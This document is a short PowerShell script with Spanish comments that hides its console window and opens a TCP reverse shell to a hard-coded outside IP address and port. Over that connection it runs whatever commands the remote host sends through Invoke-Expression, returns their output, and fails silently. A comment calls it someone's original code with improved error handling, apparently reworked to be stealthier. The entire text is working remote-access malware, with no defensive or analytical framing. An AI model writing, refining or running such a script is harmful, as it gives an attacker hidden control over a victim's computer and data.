# Ocultar ventana inmediatamente
Add-Type -Name Window -Namespace Console -MemberDefinition '
[DllImport("Kernel32.dll")]
public static extern IntPtr GetConsoleWindow();
[DllImport("user32.dll")]
public static extern bool ShowWindow(IntPtr hWnd, Int32 nCmdShow);
'
$consolePtr = [Console.Window]::GetConsoleWindow()
[Console.Window]::ShowWindow($consolePtr, 0)

# Tu código original con mejor manejo de errores
try {
    $c = New-Object System.Net.Sockets.TcpClient
    $c.Connect('147.185.221.212', 27164)
    $s = $c.GetStream()
    $w = New-Object System.IO.StreamWriter($s)
    $r = New-Object System.IO.StreamReader($s)

    while ($true) {
        $cmd = $r.ReadLine()
        if ($cmd -eq 'exit') { break }
        try { 
            $o = (Invoke-Expression $cmd 2>&1 | Out-String) 
        }
        catch { 
            $o = $_.Exception.Message 
        }
        $w.WriteLine($o)
        $w.Flush()
    }

    $r.Close()
    $w.Close()
    $s.Close()
    $c.Close()
}
catch {
    # Error silencioso
    exit 1
}
